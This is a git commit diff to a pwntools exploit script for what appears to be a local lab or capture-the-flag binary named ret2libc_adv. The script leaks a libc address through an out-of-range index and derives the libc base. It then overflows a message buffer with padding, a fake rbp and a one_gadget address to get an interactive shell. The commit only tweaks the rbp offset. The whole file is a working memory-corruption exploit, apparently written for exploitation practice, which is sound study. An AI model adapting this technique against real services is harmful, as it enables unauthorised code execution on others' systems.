73f94942ade9d022feb8a6b992879e4adf4437a6
YJK0805 <jerryko103@gmail.com>
2024-09-24 03:58:38 +0800

    edit ret2libc_adv exp

--- lab/exp/ret2libc_adv.py
+++ lab/exp/ret2libc_adv.py
@@ -1,16 +1,15 @@
 from pwn import *
 
-# r = process('../ret2libc_adv/share/ret2libc_adv')
+# r = process('./ret2libc_adv')
 r = remote('127.0.0.1', 10006)
 r.sendlineafter('>> ', '2')
 r.sendlineafter('Index: ', '11')
 number = int(r.recvline().strip().split(b': ')[1])
 libc_base = number - 0x29d90
 log.info(f'Libc: {hex(libc_base)}')
-new_rbp = libc_base + 0x21bfa8
+rbp = libc_base + 0x21c000
 one_gadget = libc_base + 0xebd43
-payload = b'A' * 0x70 + p64(new_rbp) + p64(one_gadget)
+payload = b'A' * 0x70 + p64(rbp) + p64(one_gadget)
 r.sendlineafter('>> ', '3')
 r.sendlineafter('Leave a message: ', payload)
-
 r.interactive()
